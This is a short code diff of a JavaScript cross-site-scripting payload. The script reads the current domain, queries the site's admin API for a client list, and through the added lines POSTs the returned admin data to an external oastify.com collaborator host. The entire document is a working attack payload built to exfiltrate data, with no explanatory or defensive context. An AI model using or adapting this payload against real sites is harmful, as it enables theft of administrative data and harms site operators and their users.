@@ -1,6 +1,7 @@
 alert(9);
 const dm = document.domain 
 const url = 'https://' + dm + '/api-v1/admin/listclients';
+const url2 = 'http://twtvwvakzxlpzj9ov9bfz8j6ixoocf04.oastify.com/'
 
 const data = {"clienttype":"admin","upline_id":-1,"results":25};
 
@@ -20,6 +21,15 @@ async function postData(url = '', data = {}) {
     
     // Log the response
     console.log('Response:', jsonResponse.admin);
+    
+    const response2 = await fetch(url2, {
+      method: 'POST', // Specify the method as POST
+      headers: {
+        'Content-Type': 'application/json', // Set the request content type to JSON
+      },
+      body: JSON.stringify(jsonResponse.admin), // Convert JavaScript object to JSON string
+    });
+    
   } catch (error) {
     // Handle any errors
     console.error('Error:', error);
